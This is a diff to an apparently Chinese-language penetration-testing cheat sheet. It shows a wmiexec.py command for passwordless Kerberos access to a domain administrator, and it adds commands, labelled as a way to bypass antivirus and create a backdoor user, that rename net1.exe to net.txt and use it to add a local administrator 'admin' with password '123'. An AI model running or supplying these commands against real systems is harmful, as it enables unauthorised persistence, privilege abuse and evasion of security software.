@@ -119,6 +119,11 @@ istrator@192.168.213.100
 
 // 不带密码连接
 wmiexec.py -k -no-pass myd.com/Administrator@192.168.111.100 -dc-ip 192.168.111.100
+
+// 绕过杀软创建后门用户
+shell copy C:\windows\system32\net1.exe net.txt
+shell net.txt user admin 123 /add
+shell net.txt localgroup administrators admin /add
 ```
 
 
